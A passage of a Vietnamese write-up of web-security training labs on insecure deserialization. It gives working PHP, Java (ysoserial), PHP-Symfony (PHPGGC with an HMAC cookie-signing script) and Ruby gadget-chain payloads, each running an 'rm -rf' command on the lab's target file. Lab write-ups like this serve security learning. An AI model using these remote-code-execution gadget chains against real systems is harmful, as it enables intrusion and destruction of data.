<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CustomTemplate</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $template_file_path;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $lock_file_path;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($template_file_path) {
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template_file_path</span> <span style="color:#f92672">=</span> $template_file_path;
</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span> <span style="color:#f92672">=</span> $template_file_path <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;.lock&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isTemplateLocked</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">file_exists</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getTemplate</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">file_get_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template_file_path</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">saveTemplate</span>($template) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isTemplateLocked</span>()) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_put_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>, <span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Could not write to &#34;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_put_contents</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template_file_path</span>, $template) <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#34;Could not write to &#34;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template_file_path</span>);                    
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> __destruct() {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Carlos thought this would be a good idea
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_exists</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">unlink</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>Một class <code>CustomTemplate</code> được định nghĩa với 2 thuộc tính <code>template_file_path</code> và <code>lock_file_path</code>. Ta chỉ cần quan tâm <a href="https://www.php.net/manual/en/language.oop5.magic.php" target="_blank" rel="noopener noreffer">magic method</a>
 <code>__destruct()</code> khi nó thực hiện xóa file tại <code>lock_file_path</code>, nếu nó tồn tại. Mặt khác <code>__destruct()</code> sẽ được gọi khi server thực hiện deserialize.</p>
<p>=&gt; Ta có thể tận dụng session cookie để thực hiện Object Injection như sau:</p>
<pre tabindex="0"><code>O: 14: &#34;CustomTemplate&#34;: 1: {s: 14: &#34;lock_file_path&#34;; s: 23: &#34;/home/carlos/morale.txt&#34;;}
</code></pre><p>Endcode base64 và edit cookie:</p>
<p></p>
<p></p>
<p>Solved</p>
<p></p>
<h2 id="5-exploiting-java-deserialization-with-apache-commons">5. Exploiting Java deserialization with Apache Commons</h2>
<h3 id="description-4">Description</h3>
<blockquote>
<p>This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don&rsquo;t have source code access, you can still exploit this lab using pre-built gadget chains.
To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos&rsquo;s home directory.
You can log in to your own account using the following credentials: wiener:peter</p>
</blockquote>
<h3 id="exploitation">Exploitation</h3>
<p>Cookie của ứng dụng là một Java serialize Object</p>
<p></p>
<p>Ở lab này, ta sẽ tạo <code>gadget chain</code> bằng ứng dụng có tên là <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener noreffer">ysoserial</a>
 để khai thác.</p>
<p>Đầu tiên, vì ứng dụng sử dụng thư viện <code>Apache Commons Collections</code> nên ta sẽ sử dụng <code>gadget chain</code> có tên là <code>CommonsCollections1</code>,&hellip;, <code>CommonsCollections4</code> để sinh ra payload. Sau vài lần thử, ta có thể dụng được gadget<code>CommonsCollections4</code>.</p>
<p>Payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>java <span style="color:#960050;background-color:#1e0010">\</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">xml</span><span style="color:#f92672">/</span>com.<span style="color:#a6e22e">sun</span>.<span style="color:#a6e22e">org</span>.<span style="color:#a6e22e">apache</span>.<span style="color:#a6e22e">xalan</span>.<span style="color:#a6e22e">internal</span>.<span style="color:#a6e22e">xsltc</span>.<span style="color:#a6e22e">trax</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED<span style="color:#960050;background-color:#1e0010">\</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">xml</span><span style="color:#f92672">/</span>com.<span style="color:#a6e22e">sun</span>.<span style="color:#a6e22e">org</span>.<span style="color:#a6e22e">apache</span>.<span style="color:#a6e22e">xalan</span>.<span style="color:#a6e22e">internal</span>.<span style="color:#a6e22e">xsltc</span>.<span style="color:#a6e22e">runtime</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED<span style="color:#960050;background-color:#1e0010">\</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">base</span><span style="color:#f92672">/</span>sun.<span style="color:#a6e22e">reflect</span>.<span style="color:#a6e22e">annotation</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED<span style="color:#960050;background-color:#1e0010">\</span>
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-</span>jar .<span style="color:#f92672">/</span>ysoserial<span style="color:#f92672">-</span>all.<span style="color:#a6e22e">jar</span> CommonsCollections4 <span style="color:#e6db74">&#34;rm -rf /home/carlos/morale.txt&#34;</span> 2<span style="color:#f92672">&gt;</span> nul <span style="color:#f92672">|</span> base64 <span style="color:#f92672">-</span>w0 
</span></span></code></pre></div><p></p>
<p>Sử dụng payload vừa tạo và send request</p>
<p></p>
<p>Ứng dụng có mã lỗi 500 nhưng ta vẫn solve được challange.</p>
<p></p>
<h2 id="6-exploiting-php-deserialization-with-a-pre-built-gadget-chain">6. Exploiting PHP deserialization with a pre-built gadget chain</h2>
<h3 id="description-5">Description</h3>
<blockquote>
<p>This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don&rsquo;t have source code access, you can still exploit this lab&rsquo;s insecure deserialization using pre-built gadget chains.
To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the morale.txt file from Carlos&rsquo;s home directory.
You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
</blockquote>
<h3 id="exploitation-1">Exploitation</h3>
<p>Bài này tương tự bài trên nhưng sử dụng ngôn ngữ PHP. Tool ta sẽ sử dụng cho bài này có tên là <a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener noreffer">PHPGCC</a>
</p>
<p>Cookie là một <code>PHP serialize Object</code>. Trong đó, trường <code>sig_hmac_sha1</code> chính là <code>signature</code> để verify User object tại trường <code>token</code> có bị thay đổi hay không.</p>
<p></p>
<p>Khi ta nhập session sai và gửi request, server trả về thông báo lỗi <code>signature</code> sai và thư viện sử dụng:</p>
<p></p>
<p>Ở đây ứng dụng sử dụng thư viện <code>Symphony</code> version <code>4.3.6</code>
Tiến hành tạo payload bằng <code>PHPGGC</code> tool.</p>
<p></p>
<p>Payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">php</span> <span style="color:#f92672">./</span><span style="color:#a6e22e">phpggc</span> <span style="color:#a6e22e">Symfony</span><span style="color:#f92672">/</span><span style="color:#a6e22e">RCE4</span> <span style="color:#a6e22e">system</span> <span style="color:#e6db74">&#39;rm -rf /home/carlos/morale.txt&#39;</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">base64</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">w0</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">cookie</span><span style="color:#f92672">.</span><span style="color:#a6e22e">txt</span>
</span></span></code></pre></div><p></p>
<p>Vì server sử dụng <code>signature key</code> để verify user nên ta cần <code>SECRET_KEY</code> để hoàn thành payload.</p>
<p>Đọc <code>source</code> html của ứng dụng có một đường dẫn <code>debug</code>:</p>
<p></p>
<p>Truy cập đường dẫn ta tìm được <code>SECRET_KEY</code></p>
<p></p>
<p>Sử dụng script này để sign  <code>SECRET_KEY</code> với <code>payload generated</code>:</p>
<pre tabindex="0"><code>&lt;?php
$payload = &#34;Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czozMDoicm0gLXJmIC9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9fXM6NTM6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBwb29sIjtPOjQ0OiJTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFByb3h5QWRhcHRlciI6Mjp7czo1NDoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyAHBvb2xIYXNoIjtpOjE7czo1ODoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyAHNldElubmVySXRlbSI7czo2OiJzeXN0ZW0iO319Cg==&#34;;
$secret = &#34;hwo9dc4j2ef2vmehy8o01n6m6owbbz6b&#34;;
$sig_hmac_sha1 = hash_hmac(&#34;sha1&#34;, $payload, $secret);

$cookie = urlencode(&#39;{&#34;token&#34;:&#34;&#39;.$payload.&#39;&#34;,&#34;sig_hmac_sha1&#34;:&#34;&#39;.$sig_hmac_sha1.&#39;&#34;}&#39;);
print_r($cookie);
?&gt;
</code></pre><p></p>
<p>Ứng dụng thông báo lỗi nhưng ta vẫn solve được challenge.</p>
<p></p>
<p>Solved</p>
<p></p>
<h2 id="7-exploiting-ruby-deserialization-using-a-documented-gadget-chain">7. Exploiting Ruby deserialization using a documented gadget chain</h2>
<h3 id="description-6">Description</h3>
<blockquote>
<p>This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.
To solve the lab, find a documented exploit and adapt it to create a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the morale.txt file from Carlos&rsquo;s home directory.
You can log in to your own account using the following credentials: wiener:peter</p>
</blockquote>
<h3 id="exploitation-2">Exploitation</h3>
<p>Session cookie là một <code>Ruby deserialize Object</code></p>
<p></p>
<p>Ở lab này, ta sẽ sử dụng script của một blog viết về <a href="https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html" target="_blank" rel="noopener noreffer">Universal Deserialisation Gadget for Ruby 2.x-3.x</a>
.</p>
<p>Script có nội dung như sau:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e"># Autoload the required classes</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">SpecFetcher</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Installer</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># prevent the payload from running when we Marshal.dump it</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">module</span> Gem
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Requirement</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">marshal_dump</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">[</span>@requirements<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>wa1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">WriteAdapter</span><span style="color:#f92672">.</span>new(<span style="color:#66d9ef">Kernel</span>, <span style="color:#e6db74">:system</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rs <span style="color:#f92672">=</span> <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">RequestSet</span><span style="color:#f92672">.</span>allocate
</span></span><span style="display:flex;"><span>rs<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@sets&#39;</span>, wa1)
</span></span><span style="display:flex;"><span>rs<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@git_set&#39;</span>, <span style="color:#e6db74">&#34;rm -rf /home/carlos/morale.txt&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>wa2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">WriteAdapter</span><span style="color:#f92672">.</span>new(rs, <span style="color:#e6db74">:resolve</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>i <span style="color:#f92672">=</span> <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Package</span><span style="color:#f92672">::</span><span style="color:#66d9ef">TarReader</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Entry</span><span style="color:#f92672">.</span>allocate
</span></span><span style="display:flex;"><span>i<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@read&#39;</span>, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>i<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@header&#39;</span>, <span style="color:#e6db74">&#34;aaa&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> <span style="color:#66d9ef">Net</span><span style="color:#f92672">::</span><span style="color:#66d9ef">BufferedIO</span><span style="color:#f92672">.</span>allocate
</span></span><span style="display:flex;"><span>n<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@io&#39;</span>, i)
</span></span><span style="display:flex;"><span>n<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@debug_output&#39;</span>, wa2)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>t <span style="color:#f92672">=</span> <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Package</span><span style="color:#f92672">::</span><span style="color:#66d9ef">TarReader</span><span style="color:#f92672">.</span>allocate
</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@io&#39;</span>, n)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Requirement</span><span style="color:#f92672">.</span>allocate
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>instance_variable_set(<span style="color:#e6db74">&#39;@requirements&#39;</span>, t)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#66d9ef">Marshal</span><span style="color:#f92672">.</span>dump(<span style="color:#f92672">[</span><span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">SpecFetcher</span>, <span style="color:#66d9ef">Gem</span><span style="color:#f92672">::</span><span style="color:#66d9ef">Installer</span>, r<span style="color:#f92672">]</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>require <span style="color:#e6db74">&#34;base64&#34;</span>
</span></span><span style="display:flex;"><span>puts <span style="color:#66d9ef">Base64</span><span style="color:#f92672">.</span>encode64(payload)
</span></span></code></pre></div><p></p>
<p>Thay cookie và gửi request</p>
<p></p>
<p>Ứng dụng thông báo lỗi nhưng ta vẫn solve được challenge.</p>
<p></p>
]]></description>
</item>
</channel>
</rss>
